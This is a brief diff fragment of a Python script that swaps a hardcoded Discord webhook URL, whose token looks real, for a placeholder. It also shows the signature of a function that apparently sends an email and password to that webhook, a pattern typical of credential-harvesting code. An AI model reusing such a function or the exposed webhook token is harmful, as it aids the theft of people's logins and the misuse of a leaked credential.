@@ -12,7 +12,7 @@ import json
 import os
 import sys
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1350343877583700001/PCT7RmPh1QQA2cBin3g0IUC_OD18QGnM53NkbTCHsWDmWPlTsQfp7CIByq2DbFHQt6mA"
+WEBHOOK_URL = "DISCORD-WEBHOOK"
 
 def send_to_discord(email, password):
     embed = {
